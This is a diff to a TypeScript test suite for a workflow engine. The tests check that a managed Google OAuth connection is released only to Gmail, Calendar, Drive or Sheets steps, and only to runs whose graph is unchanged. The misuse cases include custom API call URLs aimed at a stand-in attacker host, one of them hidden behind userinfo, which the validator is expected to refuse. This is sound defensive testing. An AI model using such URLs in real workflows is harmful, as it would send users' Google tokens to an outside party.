@@ -12,12 +12,13 @@ import { JarvisGoogleConnectionSource } from "../credentials/google-source";
 import type { GoogleAuth } from "../../integrations/google-auth";
 import { closeWorkflowDb, DEFAULT_IDS, getWorkflowDb, initWorkflowDb } from "../db";
 import { setEncryptionKey } from "../db/encryption";
-import { createFlow } from "../db/repos/flow";
-import { createDraftVersion } from "../db/repos/flow-version";
+import { createFlow, setPublishedVersion } from "../db/repos/flow";
+import { createDraftVersion, lockVersion, updateDraftVersion } from "../db/repos/flow-version";
 import { createFlowRun } from "../db/repos/flow-run";
 import { configureWorkflowReadiness, graphReadiness } from "../db/repos/flow-readiness";
 import { triggerHookRunId } from "../runner/triggers/hook-run-id";
 import { PieceCatalog } from "../runtime/piece-catalog";
+import { graphDigest } from "../runtime/continuation";
 import { SandboxApi } from "./server";
 
 const ACCESS_TOKEN = "synthetic-managed-google-access-token";
@@ -29,6 +30,10 @@ const pieces = new PieceCatalog([
   { name: GMAIL, displayName: "Gmail", description: "", auth: { type: "OAUTH2" }, actions: {
     send_email: { name: "send_email", displayName: "", description: "", inputSchema: { fields: [
       { name: "subject", label: "", type: "string", required: false },
+    ] } },
+    custom_api_call: { name: "custom_api_call", displayName: "", description: "", inputSchema: { fields: [
+      { name: "url", label: "", type: "json", required: false },
+      { name: "method", label: "", type: "string", required: false },
     ] } },
   }, triggers: {
     new_email: { name: "new_email", displayName: "", description: "" },
@@ -59,6 +64,10 @@ const code = (input: Record<string, unknown>, settings: Record<string, unknown> 
 });
 const http = (headers: unknown): any => ({ name: "call", type: "PIECE", settings: { pieceName: HTTP, actionName: "send_request", input: { headers } } });
 const slack = (): any => ({ name: "post", type: "PIECE", settings: { pieceName: SLACK, actionName: "send_message", input: { auth: "{{connections.jarvis:google}}" } } });
+const customCall = (url: unknown): any => ({ name: "call", type: "PIECE",
+  settings: { pieceName: GMAIL, actionName: "custom_api_call", input: { auth: "{{connections.jarvis:google}}", method: "GET", url: { url } } } });
+const gmailTrigger = (input: Record<string, unknown> = { auth: "{{connections.jarvis:google}}" }): any => ({ name: "trigger", type: "PIECE_TRIGGER",
+  settings: { pieceName: GMAIL, triggerName: "new_email", input } });
 const loop = (items: string): any => ({ name: "each", type: "LOOP_ON_ITEMS", settings: { items } });
 
 /** Graphs where something other than a Gmail/Calendar/Drive/Sheets step's auth names the managed Google connection. */
@@ -70,6 +79,23 @@ const misuses: Array<[label: string, trigger: any]> = [
   ["the auth of another piece", empty(slack())],
   ["a non-auth input of a Gmail step", empty(gmail({ auth: "{{connections.jarvis:google}}", subject: "{{connections.jarvis:google}}" }))],
   ["a loop's items", empty(loop("{{connections.jarvis:google}}"))],
+  ["a Gmail custom API call to another host", empty(customCall("https://attacker.example/collect"))],
+  ["a Gmail custom API call to plain http on its own host", empty(customCall("http://gmail.googleapis.com/gmail/v1/users/me/profile"))],
+  ["a Gmail custom API call whose host hides behind userinfo", empty(customCall("https://gmail.googleapis.com@attacker.example/x"))],
+  ["a Gmail custom API call to another Google host", empty(customCall("https://www.googleapis.com/drive/v3/files"))],
+  ["a Gmail custom API call whose URL is an expression", empty(customCall("{{trigger.url}}"))],
+  ["a Gmail custom API call whose host is templated", empty(customCall("https://{{trigger.host}}/x"))],
+  ["a Gmail custom API call whose host is completed by an expression", empty(customCall("https://gmail.googleapis.com{{trigger.rest}}"))],
+  ["a Gmail custom API call whose scheme is completed by an expression", empty(customCall("h{{trigger.rest}}"))],
+  ["a Gmail custom API call without a URL", empty(customCall(undefined))],
+];
+
+/** Custom API calls that stay on Gmail's own API host. */
+const ownHostCalls: Array<[label: string, url: string]> = [
+  ["a relative path", "/users/me/profile"],
+  ["a templated relative path", "/users/{{trigger.user}}/messages"],
+  ["an absolute URL on its own host", "https://gmail.googleapis.com/gmail/v1/users/me/profile"],
+  ["an absolute URL on its own host with a templated path", "https://gmail.googleapis.com/gmail/v1/users/{{trigger.user}}"],
 ];
 
 let api: SandboxApi;
@@ -108,6 +134,8 @@ function runOf(trigger: any, sampleInputOverride?: Record<string, Record<string,
   const flow = createFlow({});
   const version = createDraftVersion({ flowId: flow.id, displayName: "Scope", trigger });
   const run = createFlowRun({ flowId: flow.id, flowVersionId: version.id, status: "RUNNING" });
+  // The digest the RUN_FLOW handler records before the engine starts.
+  getWorkflowDb().run("UPDATE flow_run SET graph_digest = ? WHERE id = ?", [graphDigest(version.trigger), run.id]);
   if (sampleInputOverride) {
     // The frozen per-run config the worker writes before the engine starts.
     getWorkflowDb().run("UPDATE flow_run SET execution_config = ? WHERE id = ?", [JSON.stringify({ sampleInputOverride }), run.id]);
@@ -135,6 +163,19 @@ describe("readiness: a managed connection is valid only as the auth of its own p
       expect(bindingIssues(trigger).length).toBeGreaterThan(0);
     });
   }
+
+  for (const [label, url] of ownHostCalls) {
+    test(`a Gmail custom API call to ${label} is ready`, () => {
+      expect(bindingIssues(empty(customCall(url)))).toEqual([]);
+    });
+  }
+
+  test("the refusal names the pieces as people know them, and lists the piece names for tooling", () => {
+    const [issue] = bindingIssues(empty(slack()));
+    expect(issue!.message).toBe("Managed connection jarvis:google can only be used by Gmail, Google Calendar, Google Drive or Google Sheets steps");
+    expect(issue!.allowedPieces).toEqual(["@activepieces/piece-gmail", "@activepieces/piece-google-calendar",
+      "@activepieces/piece-google-drive", "@activepieces/piece-google-sheets"]);
+  });
 });
 
 describe("runtime: the engine's credential route checks the run's own graph", () => {
@@ -159,6 +200,24 @@ describe("runtime: the engine's credential route checks the run's own graph", ()
     await expectRefused(await fetchFor(runOf(empty(gmail(undefined, code({}))), { calc: { conn: "{{connections.jarvis:google}}" } })));
   });
 
+  for (const [label, url] of ownHostCalls) {
+    test(`a run with a Gmail custom API call to ${label} gets the token`, async () => {
+      expect((await fetchFor(runOf(empty(customCall(url))))).status).toBe(200);
+    });
+  }
+
+  test("a run is checked on the graph it began on: an edited draft, or no recorded graph, is refused", async () => {
+    const flow = createFlow({});
+    const version = createDraftVersion({ flowId: flow.id, displayName: "Scope", trigger: empty(code({})) });
+    const run = createFlowRun({ flowId: flow.id, flowVersionId: version.id, status: "RUNNING" });
+    await expectRefused(await fetchFor(run.id));
+    getWorkflowDb().run("UPDATE flow_run SET graph_digest = ? WHERE id = ?", [graphDigest(version.trigger), run.id]);
+    // The engine was handed a graph with a CODE step; the draft is then
+    // edited to a clean Gmail graph while the run is going.
+    updateDraftVersion(version.id, { trigger: empty(gmail()) });
+    await expectRefused(await fetchFor(run.id));
+  });
+
   test("a run whose graph never names it, or no run at all, is refused", async () => {
     await expectRefused(await fetchFor(runOf(empty(code({})))));
     await expectRefused(await fetchFor(crypto.randomUUID()));
@@ -166,11 +225,47 @@ describe("runtime: the engine's credential route checks the run's own graph", ()
 
   test("a trigger hook of a flow with a Gmail trigger gets the token; one without is refused", async () => {
     const good = createFlow({});
-    createDraftVersion({ flowId: good.id, displayName: "Hook", trigger: { name: "trigger", type: "PIECE_TRIGGER",
-      settings: { pieceName: GMAIL, triggerName: "new_email", input: { auth: "{{connections.jarvis:google}}" } } } as any });
-    expect((await fetchFor(triggerHookRunId("poll", good.id))).status).toBe(200);
+    const goodVersion = createDraftVersion({ flowId: good.id, displayName: "Hook", trigger: gmailTrigger() });
+    expect((await fetchFor(triggerHookRunId("poll", good.id, goodVersion))).status).toBe(200);
     const bad = createFlow({});
-    createDraftVersion({ flowId: bad.id, displayName: "Hook", trigger: empty(gmail()) });
-    await expectRefused(await fetchFor(triggerHookRunId("poll", bad.id)));
+    const badVersion = createDraftVersion({ flowId: bad.id, displayName: "Hook", trigger: empty(gmail()) });
+    await expectRefused(await fetchFor(triggerHookRunId("poll", bad.id, badVersion)));
+  });
+
+  test("a trigger hook is checked on the version it runs, not on another version of the flow", async () => {
+    const flow = createFlow({});
+    const published = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: gmailTrigger({
+      auth: "{{connections.jarvis:google}}", label: "{{connections.jarvis:google}}" }) });
+    lockVersion(published.id);
+    // Published before readiness refused such a trigger (publishing checks
+    // readiness now), so set directly.
+    getWorkflowDb().run("UPDATE flow SET published_version_id = ? WHERE id = ?", [published.id, flow.id]);
+    // An editable draft beside it has a valid Gmail trigger.
+    const draft = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: gmailTrigger() });
+    for (const kind of ["enable", "disable", "poll"] as const) {
+      await expectRefused(await fetchFor(triggerHookRunId(kind, flow.id, published)));
+      expect((await fetchFor(triggerHookRunId(kind, flow.id, draft))).status).toBe(200);
+    }
+    // A version of another flow is not one this hook runs.
+    const other = createFlow({});
+    await expectRefused(await fetchFor(triggerHookRunId("poll", other.id, draft)));
+  });
+
+  test("a published trigger that is valid gets the token", async () => {
+    const flow = createFlow({});
+    const published = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: gmailTrigger() });
+    lockVersion(published.id);
+    setPublishedVersion(flow.id, published.id);
+    expect((await fetchFor(triggerHookRunId("poll", flow.id, published))).status).toBe(200);
+  });
+
+  test("a trigger hook of a draft whose trigger was edited after the hook began is refused", async () => {
+    const flow = createFlow({});
+    const misusing = gmailTrigger({ auth: "{{connections.jarvis:google}}", label: "{{connections.jarvis:google}}" });
+    const draft = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger: misusing });
+    // The hook was handed the misusing trigger; the draft is then fixed.
+    const runId = triggerHookRunId("poll", flow.id, draft);
+    updateDraftVersion(draft.id, { trigger: gmailTrigger() });
+    await expectRefused(await fetchFor(runId));
   });
 });
